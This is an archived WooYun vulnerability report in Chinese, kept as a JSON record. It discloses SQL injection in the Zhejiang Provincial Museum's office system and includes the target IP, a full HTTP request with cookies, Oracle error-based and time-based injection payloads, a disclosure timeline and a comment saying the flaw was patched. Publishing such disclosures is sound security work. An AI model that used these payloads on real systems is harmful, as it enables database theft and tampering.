{"id": 48164, "wybug_id": "wooyun-2014-083962", "wybug_title": "浙江省博物馆某系统sql注入(管理员信息泄露，可修改一级文物信息）", "wybug_corp": "浙江省博物馆", "wybug_author": "路人甲", "wybug_date": "2014-11-20 14:48", "wybug_open_date": "2015-01-04 14:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向公众公开  简要描述： 浙江省博物馆某系统登录存在注入，系统管理员角色，查看藏馆财务信息，查看修改国家珍贵一级文物信息权限，系统里面删去国家级一级藏品信息，那这件藏品就永远不在了，后台存在注入，可以拖库，获取各种管理员信息 详细说明：  http://www.zhejiangmuseum.com浙江博物馆自动化办公系统登录登录地址：http://60.191.2.115:81/index.do?method=index\n\n\n\n\n\n\n\n\n\n\n\n后台存在搜索注入请求包：POST /bwg/app/manager/user/list.htm HTTP/1.1Host: 60.191.2.115:81User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://60.191.2.115:81/bwg/app/manager/user/list.htmCookie: JSESSIONID=B8BFAF45549F754A223D371B19327CC8; login=e8e1a07693ca88f624fb68a2c6cc1a51907be8f8ec32bcd167536fdae89950163c56dd6894120f4bb4a334f7bdba98d0427bb783224fb7cc3513fafe7bf29ae3Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 73s_userDomain.name=123&s_userDomain.viewname=&page.page=1&page.pagesize=15错误类型：Place: POSTParameter: s_userDomain.name    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: s_userDomain.name=123%' AND 5986=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (5986=5986) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(107)||CHR(98)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&s_userDomain.viewname=&page.page=1&page.pagesize=15    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: s_userDomain.name=123%' AND 8634=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(79)||CHR(119)||CHR(90),5) AND '%'='&s_userDomain.viewname=&page.page=1&page.pagesize=15\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n各种管理员信息，各种文物信息。。。   漏洞证明：  http://www.zhejiangmuseum.com浙江博物馆自动化办公系统登录登录地址：http://60.191.2.115:81/index.do?method=index\n\n\n\n\n\n\n\n\n\n\n\n后台存在搜索注入请求包：POST /bwg/app/manager/user/list.htm HTTP/1.1Host: 60.191.2.115:81User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://60.191.2.115:81/bwg/app/manager/user/list.htmCookie: JSESSIONID=B8BFAF45549F754A223D371B19327CC8; login=e8e1a07693ca88f624fb68a2c6cc1a51907be8f8ec32bcd167536fdae89950163c56dd6894120f4bb4a334f7bdba98d0427bb783224fb7cc3513fafe7bf29ae3Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 73s_userDomain.name=123&s_userDomain.viewname=&page.page=1&page.pagesize=15错误类型：Place: POSTParameter: s_userDomain.name    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: s_userDomain.name=123%' AND 5986=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(122)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (5986=5986) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(107)||CHR(98)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&s_userDomain.viewname=&page.page=1&page.pagesize=15    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: s_userDomain.name=123%' AND 8634=DBMS_PIPE.RECEIVE_MESSAGE(CHR(97)||CHR(79)||CHR(119)||CHR(90),5) AND '%'='&s_userDomain.viewname=&page.page=1&page.pagesize=15\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  前台登录用户名密码验证过滤，后台查询关键字过滤。    版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-11-25 10:45 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-20 16:06 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  中华上下五千年是你线上删点信息说不在就不在的么    \n     2014-11-20 17:50 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  中华上下五千年是你线上删点信息说不在就不在的么    \n     2014-11-20 18:35 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手上路。)\t\t \n  @魇我的意思是博物馆信息里面不在了，也就是丢了也可能不知道    \n     2015-01-04 18:44 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  @幻老头儿 路人甲 你暴露了，这么容易社工    \n     2015-06-30 03:42 |    \t\tlibmaru \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | 简要介绍不能为空)\t\t \n  浙江省通信管理局网络与信息安全处：       12月5日我馆办公室收到通报函后立即联系OA办公自动化系统开发商，于12月8日下午将相关漏洞的软件补丁整改到位。现经测试我馆办公自动化系统SQL注入漏洞已整改完成。    谢谢！                     浙江省博物馆信息资料中心    \n     2015-06-30 08:50 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手上路。)\t\t \n  @libmaru 啊？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}